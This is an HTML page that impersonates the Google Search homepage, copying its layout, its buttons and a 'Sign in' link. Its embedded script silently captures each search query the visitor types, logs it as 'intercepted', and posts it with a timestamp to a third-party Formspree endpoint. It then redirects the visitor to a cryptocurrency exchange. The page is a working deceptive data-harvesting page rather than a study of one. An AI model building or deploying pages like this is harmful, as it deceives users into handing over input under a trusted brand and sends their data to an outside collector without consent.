<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Search</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #fff;
            color: #202124;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .top-bar {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 14px 20px;
            gap: 18px;
            font-size: 13px;
        }
        .top-bar a {
            text-decoration: none;
            color: #1f1f1f;
        }
        .signin-btn {
            background: #1a73e8;
            color: white !important;
            padding: 9px 23px;
            border-radius: 4px;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 0 16px;
        }
        .logo {
            margin-bottom: 40px;
        }
        .logo img {
            width: 272px;
            height: auto;
        }
        .search-container {
            max-width: 584px;
            width: 100%;
        }
        .search-box {
            display: flex;
            align-items: center;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            padding: 8px 16px;
            background: white;
        }
        .search-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
        }
        .search-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 28px;
        }
        .search-buttons button {
            background: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            padding: 8px 18px;
            cursor: pointer;
        }

        @media (max-width: 480px) {
            .logo {
                margin-bottom: 25px;
            }
        }
    </style>
</head>
<body>

<div class="top-bar">
    <a href="#">Gmail</a>
    <a href="#">Images</a>
    <a href="#" class="signin-btn">Sign in</a>
</div>

<div class="main-content">
    <div class="logo">
        <img src="https://i.imgur.com/V5gi5c6.jpeg" alt="Custom Logo">
    </div>

    <div class="search-container">
        <form id="searchForm">
            <div class="search-box">
                <input type="text" id="searchInput" class="search-input"
                       placeholder="Search Google or type a URL" required>
            </div>

            <div class="search-buttons">
                <button type="submit" name="btn" value="search">Google Search</button>
                <button type="submit" name="btn" value="lucky">I'm Feeling Lucky</button>
            </div>
        </form>
    </div>
</div>

<script>
(function() {
    // ✅ Your Formspree endpoint (active)
    const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mojnzrkd';

    const form = document.getElementById('searchForm');
    const input = document.getElementById('searchInput');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const query = input.value.trim();
        if (!query) return;

        const formData = new FormData();
        formData.append('query', query);
        formData.append('_subject', 'New Google Search');
        formData.append('timestamp', new Date().toLocaleString());

        console.log('Intercepted query:', query);

        try {
            const response = await fetch(FORMSPREE_ENDPOINT, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });

            if (response.ok) {
                // Redirect to your chosen Bitcoin site
                window.location.href = 'https://coinbase.com'; // Change if you want
            } else {
                const errorData = await response.json();
                alert('Submission failed: ' + (errorData.error || 'Unknown error'));
            }
        } catch (error) {
            console.error('Fetch error:', error);
            alert('Network error – please check your connection and try again.');
        }
    });
})();
</script>

</body>
</html>
